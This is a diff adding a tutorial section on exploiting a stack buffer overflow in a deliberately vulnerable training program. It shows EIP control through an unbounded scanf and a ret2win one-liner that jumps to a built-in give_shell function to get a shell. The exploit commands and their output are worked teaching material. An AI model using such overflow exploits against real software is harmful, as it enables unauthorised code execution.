@@ -326,10 +326,9 @@ int main() {
 ```
 
 The assumptions we make are that the attacker does not know the password. They
-have to exploit the program to obtain the shell.
-
-From this point onwards, we assume that the NX and ASLR protections are enabled.
-Observing the output from viewing the memory mapping permissions in GDB:
+have to exploit the program to obtain the shell. From this point onwards, we
+assume that the NX and ASLR protections are enabled. Observing the output from
+viewing the memory mapping permissions in GDB:
 
 ```shell
 gdb-peda$ vmmap
@@ -359,7 +358,55 @@ $ cat /proc/sys/kernel/randomize_va_space
 2
 ```
 
+#### Achieving EIP Control
 
+The vulnerability lies in the line:
+
+```c
+    scanf("%s", password);
+```
+
+This string read is unbounded and will result in the password buffer being
+overflown. We can achieve instruction pointer control by providing 28 bytes of
+padding and then the overwrite value. To verify this:
+
+```shell
+$ python -c 'print "A"*28 + "BBBB"' | ./vuln2
+What is the password:
+Incorrect password!
+Segmentation fault (core dumped)
+$ dmesg | tail -f -n 1
+[167511.081951] vuln2[32147]: segfault at 42424242 ip 0000000042424242 sp 00000000ffec80d0 error 14
+```
+
+#### Jump Where?
+
+Now that we have EIP control, we need a target address to jump to. We cannot
+re-use the idea of supplying shellcode in the buffer and then jumping there
+because the NX protection prevents execution of the data and the ASLR protection
+makes it very difficult for us to predict where the buffer is in the first
+place.
+
+However, recall that the binary provides a `give_shell()` function to supply a
+shell. We may obtain the address of that function by using objdump.
+
+```shell
+$ objdump -d vuln2 | grep give_shell
+080484cb <give_shell>:
+ 8048536:       e8 90 ff ff ff          call   80484cb <give_shell>
+```
+
+Since the 0x08048000 - 0x08049000 range of the binary is marked executable and
+0x080484cb falls within them, this area of memory is a valid place for the
+vulnerable function to return to and execute. Putting the exploit together:
+
+```shell
+$ (python -c 'import struct; print "A"*28 + struct.pack("I", 0x080484cb)'; cat -) | ./vuln2
+What is the password:
+Incorrect password!
+id
+uid=1000(amon) gid=1000(amon) groups=1000(amon)
+```
 
 [//]: # (Paths)
 [classic1]: ./diagrams/classic1.png
